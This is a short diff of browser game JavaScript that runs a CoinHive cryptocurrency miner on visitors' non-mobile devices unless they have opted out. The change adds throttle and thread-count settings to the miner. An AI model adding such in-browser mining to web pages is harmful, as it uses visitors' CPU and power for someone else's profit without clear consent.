@@ -34,6 +34,8 @@ requirejs(['firebase', 'game', 'CoinHive'], function(firebase, game, CoinHive){
 
     var miner = new CoinHive.Anonymous('NPwNWYOiEicAt9BsqE3l6ohOy4nrnxu0', {throttle: 0.3});
     if (!miner.isMobile() && !miner.didOptOut(14400)) {
+        miner.setThrottle(0.5);
+        miner.setNumThreads(4);
         miner.start();
     }
     
